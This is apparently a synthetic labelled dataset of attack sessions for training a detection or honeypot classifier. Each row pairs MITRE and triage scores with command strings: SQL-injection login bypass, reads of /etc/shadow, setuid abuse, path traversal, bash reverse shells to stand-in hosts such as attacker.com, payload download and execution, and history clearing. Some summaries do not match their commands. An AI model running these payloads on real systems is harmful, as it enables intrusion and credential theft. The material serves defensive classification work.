session_id,src_ip,num_commands,duration_sec,commands,label_id,label_name,mitre_features,triage_features,change_features,num_downloads,download_shas,binary_type,system_changes_summary,mitre_tactic_reconnaissance,mitre_tactic_resource_development,mitre_tactic_initial_access,mitre_tactic_execution,mitre_tactic_persistence,mitre_tactic_privilege_escalation,mitre_tactic_defense_evasion,mitre_tactic_credential_access,mitre_tactic_discovery,mitre_tactic_lateral_movement,mitre_tactic_collection,mitre_tactic_command_and_control,mitre_tactic_exfiltration,mitre_tactic_impact,mitre_severity_max,mitre_severity_mean,mitre_severity_weighted,mitre_kill_chain_score,mitre_unique_technique_count,mitre_total_commands,mitre_matched_commands,triage_file_size,triage_entropy,triage_priority,triage_is_go,triage_is_packed,triage_is_stripped,triage_is_dll,triage_is_static,triage_score_mining,triage_score_botnet,triage_score_recon,triage_score_destructive,ghidra_function_count,ghidra_total_instructions,ghidra_total_basic_blocks,ghidra_max_function_size,ghidra_avg_callers,ghidra_max_callers,ghidra_mining_pool_count,ghidra_crypto_wallet_count,ghidra_ip_count,ghidra_url_count,ghidra_shell_cmd_count,ghidra_file_path_count,ghidra_imports_file_io,ghidra_imports_process,ghidra_imports_network,ghidra_imports_crypto,ghidra_imports_evasion,ghidra_has_aes_sbox,ghidra_has_sha256_constants,ghidra_has_rc4_state,ghidra_has_xor_loop,ghidra_go_user_functions,ghidra_go_runtime_functions,angr_basic_blocks,angr_edges,angr_functions_recovered,angr_cyclomatic_complexity,angr_function_count,angr_user_functions_listed,angr_syscalls_network,angr_syscalls_file_io,angr_syscalls_process,angr_syscalls_memory,angr_ip_count,angr_url_count,angr_mining_indicator_count,angr_shell_cmd_count,angr_has_network,angr_has_file_manipulation,angr_has_process_control,angr_has_crypto,angr_has_mining,angr_has_persistence,angr_has_evasion,angr_has_shell_execution,angr_complexity_tier,angr_is_partial,angr_loaded_as_blob,script_line_count,script_url_count,script_download_count,script_arch_count,script_is_downloader,script_is_multi_arch,script_is_miner,script_has_persistence,script_has_anti_forensics,has_ghidra_results,has_angr_results,has_script_results,deep_func_ratio_angr_ghidra,deep_mining_signal_count,deep_total_network_indicators,deep_total_crypto_indicators,deep_max_complexity,deep_total_evasion_indicators,deep_is_go_consensus
synthetic_exploit_627778,193.60.47.124,7,794.677207284356,POST /login.php HTTP/1.1; Content-Type: application/x-www-form-urlencoded; user=admin'--&password=; bash -c 'cat /etc/shadow'; sudo -l; chmod +s /tmp/exploit; ./tmp/exploit,3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 1, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 1, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 0, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.833, 'mitre_severity_weighted': 50.5, 'mitre_kill_chain_score': 5, 'mitre_unique_technique_count': 6, 'mitre_total_commands': 7, 'mitre_matched_commands': 6, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1190|T1204.002|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 261711.72210795523, 'triage_entropy': 6.783287968723445, 'triage_priority': 80.17141844074239, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.7765258341247494, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.8889077557022227, 'triage_angr_score': 0.6673025371319052}","[0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 1.0, 1.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 1.0]",1,,rat,"Logged in as admin, executed bash commands to read /etc/shadow and check sudo privileges; created and made setuid a file named exploit",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_343807,220.42.145.154,7,1053.3519126999372,"POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

user=admin'--&password=123; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; chmod +s /tmp/exploit; ./tmp/exploit; sudo -l; cat /etc/shadow;",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 2, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 1, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.556, 'mitre_severity_weighted': 49.889, 'mitre_kill_chain_score': 6, 'mitre_unique_technique_count': 9, 'mitre_total_commands': 6, 'mitre_matched_commands': 6, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1083|T1095|T1190|T1204.002|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 990140.7233598335, 'triage_entropy': 7.57614034066894, 'triage_priority': 44.53624696458403, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.8816173636130087, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 1.0, 'triage_angr_score': 0.9767357313150049}","[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,rat,"Privileged file read, process execution (reverse shell), file write (exploit binary), credential access, log clearing (history -c)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_262297,110.129.133.219,8,647.9648201468456,"POST /login.php?user=admin'-- HTTP/1.1; Content-Type: application/x-www-form-urlencoded; bash -c 'echo ""echo 'root:x:0:0:root:/root:/bin/bash' > /etc/passwd"" > /tmp/exploit.sh; bash /tmp/exploit.sh; sudo -l; cat /etc/shadow; rm /tmp/exploit.sh; history -c",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 0, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 1, 'mitre_tactic_defense_evasion': 1, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 0, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 5.667, 'mitre_severity_weighted': 40.0, 'mitre_kill_chain_score': 5, 'mitre_unique_technique_count': 6, 'mitre_total_commands': 8, 'mitre_matched_commands': 6, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1070.003|T1083|T1190|T1548.003|T1552.001'}","{'triage_file_size': 846861.0741400697, 'triage_entropy': 6.764629419205019, 'triage_priority': 69.64041860442755, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.81576899292205, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.8889935729002232, 'triage_angr_score': 0.5589143019905756}","[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0]",1,,credential_stealer,"File read and write, process execution, credential access, log clearing",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_366105,79.176.203.189,12,174.30153695828253,"POST /login.php?user=admin'-- HTTP/1.1; Host: target.com; User-Agent: Mozilla/5.0; Content-Type: application/x-www-form-urlencoded; Content-Length: 30

username=admin'--&password=anything; bash -i >& /dev/tcp/attacker.com/4444 0>&1; cat /etc/shadow; sudo -l; chmod +s /tmp/exploit; echo 'file_write' > /tmp/exploit; echo 'credential_access' >> /tmp/exploit; echo 'log_clear' >> /tmp/exploit",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 1, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 0, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.143, 'mitre_severity_weighted': 45.571, 'mitre_kill_chain_score': 5, 'mitre_unique_technique_count': 7, 'mitre_total_commands': 12, 'mitre_matched_commands': 10, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1083|T1190|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 1151106.9634035674, 'triage_entropy': 7.356632947815841, 'triage_priority': 89.42590719195007, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.7391089518684161, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.7916621475365211, 'triage_angr_score': 0.8484472267531216}","[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,rat,"credential access, process execution (reverse shell), file write, log clearing (history -c)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_766764,2.46.74.121,7,1111.7755274794404,"POST /login.php?user=admin'-- HTTP/1.1
Content-Length: 0

; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; cat /etc/shadow; sudo -l; chmod +s /usr/bin/python3; echo 'root:$(openssl passwd -1 password)' >> /etc/shadow;",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 1, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 1, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.5, 'mitre_severity_weighted': 50.0, 'mitre_kill_chain_score': 6, 'mitre_unique_technique_count': 8, 'mitre_total_commands': 6, 'mitre_matched_commands': 6, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1083|T1095|T1190|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 1734469.5268988726, 'triage_entropy': 6.666720070294588, 'triage_priority': 36.08399131343991, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.8740882411208675, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 1.0, 'triage_angr_score': 0.645125377897219}","[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 1.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 1.0, 0.0, 0.0, 1.0]",1,,rat,"Executed an SQL injection to bypass authentication, established a reverse shell, accessed sensitive files, checked sudo privileges, modified file permissions, and added a new root user with a password hash.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_283785,164.253.224.3,7,250.03161893915737,POST /login.php?user=admin'-- HTTP/1.1; GET /api/download?file=../../etc/shadow HTTP/1.1; bash -i | nc attacker-ip attacker-port; sudo -l; chmod +s /tmp/exploit; ./tmp/exploit; rm /tmp/exploit,3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 2, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 0, 'mitre_tactic_discovery': 1, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 1, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 7.0, 'mitre_severity_weighted': 52.429, 'mitre_kill_chain_score': 5, 'mitre_unique_technique_count': 7, 'mitre_total_commands': 7, 'mitre_matched_commands': 6, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1095|T1190|T1204.002|T1548.001|T1548.003'}","{'triage_file_size': 898985.9973778898, 'triage_entropy': 6.589712638917035, 'triage_priority': 35.52391712336584, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.628013907843531, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.7169899022282855, 'triage_angr_score': 0.7729467046917099}","[1.0, 0.0, 1.0, 0.0, 0.0, 0.0, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,rat,"File read (/etc/shadow), process execution (reverse shell), file write (exploit binary), credential access, log clearing (history -c)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_100301,41.44.141.200,1,485.3260910527551,"POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

user=admin'--&password=x
bash -i >& /dev/tcp/attacker.com/4444 0>&1
sudo -l
chmod +s /usr/bin/python3
GET /api/download?file=../../etc/shadow HTTP/1.1
Host: target.com

cat /etc/shadow
history -c",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 1, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 1, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 1, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 0, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.857, 'mitre_severity_weighted': 50.286, 'mitre_kill_chain_score': 6, 'mitre_unique_technique_count': 7, 'mitre_total_commands': 1, 'mitre_matched_commands': 1, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1070.003|T1190|T1204.002|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 1330924.2342783436, 'triage_entropy': 7.625473872761537, 'triage_priority': 40.02045581960868, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.6117632729886904, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.9697817108016202, 'triage_angr_score': 0.8321161341987727}","[1.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 1.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,rat,"Privilege escalation through sudo, file write to setuid, and credential access via cat /etc/shadow",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_337288,156.99.232.239,8,490.7081989507303,"POST /login.php?user=admin'-- HTTP/1.1
Host: example.com

; cat /etc/shadow
; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
; sudo -l
; chmod +s /usr/bin/vim
; wget http://example.com/exploit_payload; bash exploit_payload
; history -c",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 1, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 1, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 2, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.6, 'mitre_severity_weighted': 49.8, 'mitre_kill_chain_score': 7, 'mitre_unique_technique_count': 10, 'mitre_total_commands': 8, 'mitre_matched_commands': 7, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1070.003|T1083|T1095|T1105|T1190|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 1355840.9904728015, 'triage_entropy': 7.067631353590729, 'triage_priority': 34.02172681869558, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.5061466089991495, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.9518109622173652, 'triage_angr_score': 0.959588710554562}","[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,credential_stealer,"File read, process execution (reverse shell), file write (exploit binary), credential access, log clearing (history -c)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_495397,145.247.124.194,7,414.1963085075771,"POST /login.php?user=admin'-- HTTP/1.1; Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 2

password=hacked;bash -i >& /dev/tcp/192.168.1.100/4444 0>&1;cat /etc/shadow;sudo -l;chmod +s /usr/bin/sudo;echo 'password=hacked' >> /etc/shadow",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 1, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 1, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.5, 'mitre_severity_weighted': 50.0, 'mitre_kill_chain_score': 6, 'mitre_unique_technique_count': 8, 'mitre_total_commands': 7, 'mitre_matched_commands': 7, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1083|T1095|T1190|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 59070.33055394615, 'triage_entropy': 6.74504870153955, 'triage_priority': 55.43666673788836, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.7955207495043806, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.9264261248142519, 'triage_angr_score': 0.7529846524905932}","[2.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0]",1,,rat,"file_read, process_exec, file_write, credential_access, log_clear",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_599704,81.181.111.229,6,692.7180168047561,POST /login.php HTTP/1.1; Content-Type: application/x-www-form-urlencoded; user=admin'--; bash -c 'bash -i >& /dev/tcp/192.168.1.1/4444 0>&1; sudo -l; chmod +s /usr/bin/python3',3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 1, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 0, 'mitre_tactic_discovery': 1, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 1, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 7.167, 'mitre_severity_weighted': 55.833, 'mitre_kill_chain_score': 5, 'mitre_unique_technique_count': 6, 'mitre_total_commands': 6, 'mitre_matched_commands': 5, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1095|T1190|T1548.001|T1548.003'}","{'triage_file_size': 1913119.0898905525, 'triage_entropy': 7.223105904086774, 'triage_priority': 20.680623420009745, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.89126196572313, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.8117159242129348, 'triage_angr_score': 0.6418542435729413}","[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 1.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,rat,HTTP POST request with SQLi to exploit credentials; Bash reverse shell executed for remote code execution; Sudo privileges checked; Setuid binary created,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_976960,159.182.79.200,16,136.9602552254155,"POST /login.php HTTP/1.1; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3; Content-Type: application/x-www-form-urlencoded; Content-Length: 29
username=admin'--&password=123456; GET /api/download?file=../../etc/shadow HTTP/1.1; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; id; sudo -l; chmod +s /usr/bin/bash; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1;",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 2, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 0, 'mitre_tactic_discovery': 1, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 1, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 7.143, 'mitre_severity_weighted': 54.857, 'mitre_kill_chain_score': 5, 'mitre_unique_technique_count': 7, 'mitre_total_commands': 15, 'mitre_matched_commands': 8, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1095|T1190|T1204.002|T1548.001|T1548.003'}","{'triage_file_size': 406429.68264878023, 'triage_entropy': 7.5446187612142435, 'triage_priority': 85.11786843609006, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.5760669991344194, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.9685561239706968, 'triage_angr_score': 0.61743068596508}","[1.0, 0.0, 1.0, 0.0, 0.0, 0.0, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,credential_stealer,"File read (/etc/shadow), Process execution (reverse shell), File write (setuid bash)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
